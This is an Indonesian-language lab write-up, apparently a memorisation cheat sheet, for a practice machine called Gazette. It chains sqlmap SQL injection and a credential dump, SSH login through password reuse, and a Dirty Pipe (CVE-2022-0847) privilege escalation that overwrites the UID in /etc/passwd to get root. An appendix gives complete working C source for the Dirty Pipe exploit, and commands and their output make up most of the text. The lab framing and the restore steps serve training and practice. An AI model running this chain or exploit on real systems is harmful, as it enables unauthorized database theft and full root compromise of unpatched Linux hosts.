# Write-Up Singkat Privilege Escalation Gazette
> **Versi Closed Book — Command Inti Mudah Dihafal**

## Target

```text
http://192.168.56.121:8000
```

## Rantai Serangan

```text
SQL Injection
→ Dump kredensial
→ Password reuse ke SSH
→ Foothold sebagai editor
→ Dirty Pipe
→ UID editor menjadi 0
→ Root
```

## Mnemonik

```text
S-D-S-K-U-R
```

- **S** = SQL Injection
- **D** = Dump user
- **S** = SSH
- **K** = Kernel check
- **U** = Ubah UID
- **R** = Root

---

# 1. Verifikasi SQL Injection

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -p id \
  --batch \
  --technique=U
```

Indikator berhasil:

```text
Parameter id injectable
UNION query
7 columns
MariaDB/MySQL
```

---

# 2. Enumerasi Database

## Lihat database

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" --dbs
```

Hasil penting:

```text
gazette
```

## Lihat tabel

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -D gazette \
  --tables
```

Hasil:

```text
news
users
```

---

# 3. Dump Kredensial

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" \
  -D gazette \
  -T users \
  --dump
```

Kredensial yang ditemukan:

```text
Username : editor
Password : password123
```

---

# 4. Login SSH

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

Verifikasi:

```bash
id
```

Hasil awal:

```text
uid=1001(editor) gid=1001(editor)
```

---

# 5. Cek Sudo dan Kernel

## Cek sudo

```bash
sudo -l
```

Hasil:

```text
editor may not run sudo
```

## Cek kernel

```bash
cat /proc/version
```

Hasil penting:

```text
Linux 5.10.70-1
```

Kernel tersebut rentan terhadap **Dirty Pipe**.

---

# 6. Siapkan Backup

```bash
cp /etc/passwd ~/passwd.bak
sha256sum /etc/passwd ~/passwd.bak
```

Hash harus sama.

---


# 7. Mendapatkan File `dirtypipe.c`

`dirtypipe.c` **bukan file bawaan target**. Source-nya harus disiapkan oleh penguji.

## Sumber asli

PoC Dirty Pipe dipublikasikan oleh **Max Kellermann** pada halaman resmi:

```text
https://dirtypipe.cm4all.com/#exploiting
```

Pada halaman tersebut, cari bagian:

```text
Exploiting
→ This is my proof-of-concept exploit
```

Kode pada **Lampiran A** di write-up ini adalah versi generik yang diadaptasi dari PoC tersebut untuk kebutuhan lab. Versi ini menerima tiga argumen:

```text
TARGET_FILE OFFSET DATA
```

Contoh:

```bash
./dirtypipe /etc/passwd 2192 0000
```

## Cara paling mudah menyiapkannya

### Opsi A — Simpan di Kali lalu kirim dengan SCP

Di Kali, buat file:

```bash
nano dirtypipe.c
```

Salin kode pada **Lampiran A**, lalu simpan:

```text
Ctrl+O → Enter → Ctrl+X
```

Kirim ke target:

```bash
scp dirtypipe.c editor@192.168.56.121:/home/editor/
```

Masukkan password:

```text
password123
```

Setelah login SSH ke target:

```bash
cd /home/editor
ls -l dirtypipe.c
```

### Opsi B — Buat langsung pada target

Setelah login sebagai `editor`:

```bash
cd /home/editor
nano dirtypipe.c
```

Tempel kode pada **Lampiran A**, kemudian simpan:

```text
Ctrl+O → Enter → Ctrl+X
```

### Opsi C — Exploit-DB/SearchSploit sebagai referensi alternatif

Kali biasanya mempunyai salinan lokal Exploit-DB:

```bash
searchsploit 50808
searchsploit -m 50808
```

Perintah tersebut menyalin exploit Dirty Pipe dari **EDB-ID 50808**. Namun, exploit itu merupakan varian lain dan cara menjalankannya dapat berbeda. Untuk mengikuti command pada write-up ini secara persis, gunakan `dirtypipe.c` pada **Lampiran A**.

## Verifikasi file

```bash
head -n 5 /home/editor/dirtypipe.c
```

Bagian awal seharusnya memuat:

```c
/* SPDX-License-Identifier: GPL-2.0 */
#define _GNU_SOURCE
```

---

# 8. Kompilasi PoC Dirty Pipe

Pastikan berada di direktori tempat source disimpan:

```bash
cd /home/editor
ls -l dirtypipe.c
```

Kompilasi:

```bash
gcc -O2 dirtypipe.c -o dirtypipe
```

Verifikasi:

```bash
ls -l dirtypipe
```

Uji pada file biasa:

```bash
printf 'ABCDEFGH\n' > dp-test
chmod 444 dp-test
./dirtypipe dp-test 1 Z
cat dp-test
```

Hasil:

```text
AZCDEFGH
```

Artinya Dirty Pipe bekerja.

---

# 9. Cari Offset User `editor`

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Hasil:

```text
2183:editor:x:1001:1001
```

Offset UID:

```text
2183 + 9 = 2192
```

---

# 10. Ubah UID Menjadi 0

```bash
./dirtypipe /etc/passwd 2192 0000
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil:

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

---

# 11. Menjadi Root

Jangan logout dari sesi lama.

```bash
su - editor
```

Masukkan:

```text
password123
```

Verifikasi:

```bash
id
```

Hasil akhir:

```text
uid=0(root) gid=1001(editor)
```

Privilege escalation berhasil.

---

# 12. Pemulihan

Setelah bukti root diperoleh:

```bash
install -o root -g root -m 0644 \
  /home/editor/passwd.bak \
  /etc/passwd
```

Verifikasi:

```bash
grep '^editor:' /etc/passwd
```

Hasil normal:

```text
editor:x:1001:1001::/home/editor:/bin/bash
```

Hapus file pengujian:

```bash
rm -f ~/dirtypipe ~/dirtypipe.c ~/dp-test
```

---

# Ringkasan Super Singkat

```bash
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" --dbs
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" -D gazette --tables
sqlmap -u "http://192.168.56.121:8000/news/detail?id=1" -D gazette -T users --dump

ssh editor@192.168.56.121
# password123

cat /proc/version
cp /etc/passwd ~/passwd.bak
# dirtypipe.c dibuat dari Lampiran A atau dikirim dengan SCP
cd /home/editor
gcc -O2 dirtypipe.c -o dirtypipe
grep -bo 'editor:x:1001:1001' /etc/passwd
./dirtypipe /etc/passwd 2192 0000
su - editor
id
```

---

# Kesimpulan

Kerentanan SQL Injection memungkinkan pengambilan kredensial akun `editor`. Password aplikasi digunakan kembali pada akun SSH Linux. Setelah login sebagai `editor`, kernel Debian `5.10.70-1` dieksploitasi menggunakan Dirty Pipe untuk mengubah UID akun `editor` menjadi `0`. Perintah `su - editor` kemudian menghasilkan shell dengan hak root.

---

# Lampiran A — Source `dirtypipe.c`

> Sumber dasar: PoC resmi CVE-2022-0847 oleh Max Kellermann, CM4all GmbH/IONOS SE.  
> Versi berikut disederhanakan untuk validasi file read-only pada lab terotorisasi.

```c
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
 * Original author: Max Kellermann <max.kellermann@ionos.com>
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Modified for an authorized security lab.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static void die(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

static void prepare_pipe(int pipe_fd[2])
{
    if (pipe(pipe_fd) != 0) {
        die("pipe");
    }

    const unsigned int pipe_size =
        (unsigned int)fcntl(pipe_fd[1], F_GETPIPE_SZ);

    static char buffer[4096];

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (write(pipe_fd[1], buffer, size) != (ssize_t)size) {
            die("write pipe");
        }

        remaining -= size;
    }

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (read(pipe_fd[0], buffer, size) != (ssize_t)size) {
            die("read pipe");
        }

        remaining -= size;
    }
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(
            stderr,
            "Usage: %s TARGET_FILE OFFSET DATA\n",
            argv[0]
        );
        return EXIT_FAILURE;
    }

    const char *target_path = argv[1];
    loff_t offset = strtoll(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    if (offset <= 0) {
        fprintf(stderr, "Offset harus lebih besar dari 0\n");
        return EXIT_FAILURE;
    }

    if ((offset % 4096) == 0) {
        fprintf(
            stderr,
            "Offset tidak boleh tepat di batas halaman\n"
        );
        return EXIT_FAILURE;
    }

    loff_t next_page = (offset | 4095) + 1;

    if (offset + (loff_t)data_size > next_page) {
        fprintf(
            stderr,
            "Data melewati batas halaman 4096 byte\n"
        );
        return EXIT_FAILURE;
    }

    int target_fd = open(target_path, O_RDONLY);

    if (target_fd < 0) {
        die("open");
    }

    struct stat target_stat;

    if (fstat(target_fd, &target_stat) != 0) {
        die("fstat");
    }

    if (offset + (loff_t)data_size > target_stat.st_size) {
        fprintf(stderr, "Data melewati ukuran file\n");
        return EXIT_FAILURE;
    }

    int pipe_fd[2];
    prepare_pipe(pipe_fd);

    loff_t splice_offset = offset - 1;

    if (
        splice(
            target_fd,
            &splice_offset,
            pipe_fd[1],
            NULL,
            1,
            0
        ) != 1
    ) {
        die("splice");
    }

    ssize_t written = write(pipe_fd[1], data, data_size);

    if (written < 0) {
        die("write");
    }

    if ((size_t)written != data_size) {
        fprintf(
            stderr,
            "Short write: %zd dari %zu byte\n",
            written,
            data_size
        );
        return EXIT_FAILURE;
    }

    printf(
        "Berhasil menulis %zu byte pada offset %lld\n",
        data_size,
        (long long)offset
    );

    close(target_fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);

    return EXIT_SUCCESS;
}
```

## Cara membuat file dari lampiran

```bash
nano /home/editor/dirtypipe.c
```

Tempel seluruh kode di atas, lalu:

```text
Ctrl+O → Enter → Ctrl+X
```

Kompilasi:

```bash
cd /home/editor
gcc -O2 dirtypipe.c -o dirtypipe
```
